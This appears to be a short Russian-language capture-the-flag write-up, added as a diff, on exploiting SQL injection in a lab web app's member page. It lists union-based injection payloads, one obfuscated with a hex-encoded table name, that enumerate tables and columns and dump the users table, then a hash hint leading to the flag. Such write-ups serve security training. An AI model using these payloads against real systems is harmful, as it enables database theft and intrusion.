@@ -1,0 +1,19 @@
+По адресу:
+http://192.168.56.1/?page=member
+Можем сделать sqlInjection
+
+Сначала получаем список всех таблиц
+1 and 1=0 union select null,table_name from information_schema.tables limit 0,50
+
+Дальше получаем названия колонок в таблице
+(1)and(1)=(0)union(select(null),group_concat(column_name)from(information_schema.columns)where(table_name)=(0x7573657273))
+
+После чего вытаскиваем имя и фамилию
+1 and 1=0 union select Commentaire,countersign from users limit 0,5
+
+В итоге замечаем в одном из полей
+First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Surname : 5ff9d0165b4f92b14994e5c685cdce28
+
+Выполняем данные указания и получаем флаг.
+
